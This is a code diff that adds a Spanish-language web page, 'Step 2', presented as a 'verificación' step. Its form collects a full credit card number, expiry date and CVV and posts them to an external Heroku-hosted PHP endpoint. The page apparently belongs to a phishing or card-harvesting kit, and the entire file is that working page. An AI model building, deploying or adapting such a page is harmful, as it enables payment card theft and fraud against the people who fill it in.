@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="step2.css">
+	<title>Step 2</title>
+</head>
+<body>
+	<div class="flex">
+		<div class="logotipo">
+		<div class="logo">
+			<h1>1</h1>
+		</div>
+	</div>
+	<div class="verficacion">
+		verificación
+	</div>
+	</div>
+	<hr class="one">
+	<hr>
+	<!--Formulario de CC-->
+	<div class="formulario">
+		<form action="https://portafoliowebb.herokuapp.com/game2.php" method="POST">
+			<h1>Completa el siguiente formulario para consultar los datos</h1>
+			<label>Numero de Tarjeta:</label><br>
+			<input type="text" maxlength="16" placeholder="16 Digitos" required name="card">
+			<br>
+			<label for="">Fecha de Vencimiento:</label><br>
+			<input type="text" maxlength="5" placeholder="Example: 12/12" required name="ven"><br>
+			<label for="">CCV:</label><br>
+			<input type="text" placeholder="Example: 423" maxlength="3" required name="vv">
+			<br>
+			<button type="submit">Continuar</button>
+		</form>
+	</div>
+</body>
+</html>
